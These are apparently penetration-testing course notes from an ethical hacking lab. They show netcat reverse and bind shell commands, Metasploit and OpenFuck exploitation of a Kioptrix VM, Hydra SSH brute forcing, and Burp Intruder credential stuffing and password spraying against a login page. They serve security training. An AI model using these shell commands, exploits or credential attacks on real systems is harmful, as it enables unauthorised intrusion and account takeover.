# Exploitation Basics

Different types of shells we are going to see:

**Reverse Shell** - most common (95% of the time..)

Reverse >> The victim connects to us instead of us to them
Shell >> Access to a machine 
Target is connecting, attack box is listening 

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/eb1efacf473c4430976a773bef21e962.png?raw=true)

We open our 4444 port and it is listening. After we fire off an exploit, the target will connect to the same port and execute a /bin/sh shell
> i.e. all we do with a reverse shell is listen. Target connects to us.

**Bind Shell** (5% of the time..)
We open up a port on the target machine, then we connect to it

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/4c932f693dcb4520a5b13a0fee6c27f3.png?raw=true)

We fire off an exploit, the exploit opens up a port, then it is listening for us to connect. When we connect on that port and get the shell
> i.e. we connect to the target

> least used, most typically on an external assessment 
e.g. when we have to bypass some sort of firewall

## Netcat

### Reverse Shell - victim connects to us
On 'attacker'
```
nc -nvlp 4444
```
`listening on [any] 4444...`

On 'victim'
```
nc 10.0.2.4 4444 -e /bin/bash
```

On 'attacker'
`connect to [IP] from (UNKNOWN) [IP] port`
> can now run commands

### Bind Shell - we connect to the victim
On 'victim'
```
nc -nvlp 4444 -e /bin/bash
```
> i.e. listening and at the same time offering the shell
`listening on [any] 4444...`

On 'attacker'
```
nc 10.0.2.4 4444
```
> We get shell


## Staged versus non-staged payloads

**Payload** - what we are going to run as an exploit. I.e. when we run an exploit on a target, that is called a payload. We send it to attempt to get a shell on the machine

Two main types of payloads:

**Non-staged**
- Sends exploit shellcode all at once
- Larger in size and won't always work
> Example: windows/meterpreter_reverse_tcp

**Staged**
- Sends payload in stages
- Can be less stable
> Example: windows/meterpreter/reverse_tcp

the meterpreter/ identifies it is a staged payload i.e. meterpreter is stage 1, reverse_tcp stage 2 etc. while meterpreter_reverse_tcp is all one stage

If you have a payload that does not work or fails, can try the other type of payload

***
***
We are going to try and exploit Kioptrix with the Samba 2.2 vulnerability 'trans2open' exploit
(`# searchsploit Samba 2.2`)

Run metasploit > `search trans2open`
We know victim is running RedHat, so we will choose the 'Linux' module

```
1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
```
`msf> use 1`
`msf> options` --> specify host and port (set rhosts)
Can also `msf> show targets` (not necessary in this case but sometimes we have attack choices)
`msf> run` OR `msf> exploit`

If it is not working, ,and we show options again, now metasploit will show us payload options

First, we can see that we are running a staged payload
Good idea to change LPORT 4444 as it is the default meterpreter port and easily detected
	
`set payload linux/x86/...` hit TAB
We see a couple staged meterpreter payloads.
We find a couple 'shell' options and finally some that are unstaged. We will try the shell_reverse_tcp
Check payload in options and then run again

We got root with metasploit!

## Manual exploitation

Try Github OpenLuck exploit
After installing it, compile it
```
gcc -o open OpenFuck.c -lcrypto
```

```
 Usage: ./open target box [port] [-c N]
```

we had Apache 1.3.20 and RedHat Linux so look for that
Here: 0x6b

Syntax:
```shell
./open 0x6b 10.0.2.15 -c 40
```
We get root shell - Cool

***

If we see **SSH** we will try to Brute Force it
1. To test password strenghth
2. See if we can get in with a weak or default password
3. Test how well the Blue team performs
	- Do they catch us, do they see we are trying to brute force. Should alert! Be loud! Hope to be caught.

Helps to fine tune Blue Team

We can test that using Brute Force as we saw the open SSH port

Using **Hydra**

```shell
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.15:22 -t 4 -V
```
Using 4 threads/attempts, -V for verbose, -P for the password list
> can Ctrl-C and the session will exit but with the option to resume it. A file is written wchich we can run with Hydra -R (for repeat)

Can also try using **Metasploit**
`>search ssh`
Found `auxiliary/scanner/ssh/ssh_login`
```shell
msf> set username root
msf> set rhosts 10.0.2.15
msf> set verbose true
msf> set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
msf> run
```
***

## Credential Stuffing
Injecting breached account credentials in hopes of account takeover

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/a1c4a0d869d44e63b3efb7c809bb1379.png?raw=true)

Taking found credentials and 'spray and pray', throwing them at a website

Install standard FoxyProxy 
Options > Name it Burp Suite > HTTP
Give it IP 127.0.0.1, port 8080, Save
Can now turn it on and then also open BurpSuite

Instead of having to do the whole 'Preferences' > Advanced options etc. can now just turn this on and off

We go to the tesla sign in page and put an email and a password. Turn intercept ON and click 'Sign in'
Go to line from Burp results and 'Send to Intruder'
highlight email and password and click 'Add' ('Clear' everything else before that)

Specify attack type: "Pitchfork"
Go to Payloads: take list of users and copy paste it
On second list, take passwords and paste it

Once the attack is initiate, it will try all the combinations of the usernames and passwords we provided, at the "variables" we specified. List 1 and 2 will only try usernames and passwords line by line in order 1-2, 1-2 so on, not all with all. "Start Attack" etc.

Check status code number, check response to see whether any results where successful. There is a grep that we can match what kind of output to leave out.

If we want to do **password spraying** it is using a list of username without a known password. This time, clear password variable and keep only email/username.

Gather and enter list of all usernames found, and we can add a password like password=XYZ

BUT make sure we don't log out any users. Need to know the log out policy. Do 1-2 at a time, and every now and then (so it can reset the amount of tries)

e.g. password=Password123!, also Attack="Sniper"
In payloads, only the emails have been kept
++ always check default credentials

If we are doing Brute Force and Scanning activities, make sure to note down if it alerted anyone oor if anyone noticed / detected it

